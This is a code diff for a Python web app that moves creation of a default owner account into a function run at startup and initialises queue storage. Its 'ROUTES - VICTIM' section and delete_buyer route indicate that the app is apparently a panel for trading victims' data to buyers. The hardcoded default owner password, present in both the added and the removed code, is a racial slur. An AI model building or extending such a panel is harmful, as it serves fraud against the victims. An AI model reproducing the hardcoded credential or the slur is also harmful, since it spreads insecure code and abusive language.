@@ -36,6 +36,33 @@ def save_config(data):
         json.dump(data, f, indent=2)
 
 # ============================================================
+# INIT — RUNS ON STARTUP (EVEN WITH GUNICORN)
+# ============================================================
+
+def init_config():
+    """Create default owner if none exists — runs on app startup"""
+    config = load_config()
+    
+    if not config.get('owners'):
+        config['owners'] = [{
+            'username': 'owner',
+            'password': 'nigga',  # ← CHANGE THIS TO YOUR PASSWORD
+            'created': datetime.now().isoformat()
+        }]
+        save_config(config)
+        print("✅ Owner created: owner / [your-password]")
+    
+    # Also ensure database exists
+    db = load_db()
+    if not db.get('queues'):
+        db['queues'] = {"A": [], "B": [], "C": []}
+        save_db(db)
+        print("✅ Database initialized")
+
+# Run config init when app starts
+init_config()
+
+# ============================================================
 # ROUTES - VICTIM
 # ============================================================
 
@@ -355,20 +382,8 @@ def delete_buyer():
     return jsonify({'success': False, 'message': 'Buyer not found'})
 
 # ============================================================
-# INIT — HARDCODED OWNER (NOT VISIBLE ANYWHERE)
+# RUN
 # ============================================================
 
 if __name__ == '__main__':
-    config = load_config()
-    
-    # Create default owner if none exists — CHANGE THIS PASSWORD
-    if not config.get('owners'):
-        config['owners'] = [{
-            'username': 'owner',
-            'password': 'nigga',  # ← CHANGE THIS TO YOUR OWN PASSWORD
-            'created': datetime.now().isoformat()
-        }]
-        save_config(config)
-        print("✅ Owner created")
-    
     app.run(host='0.0.0.0', port=10000)
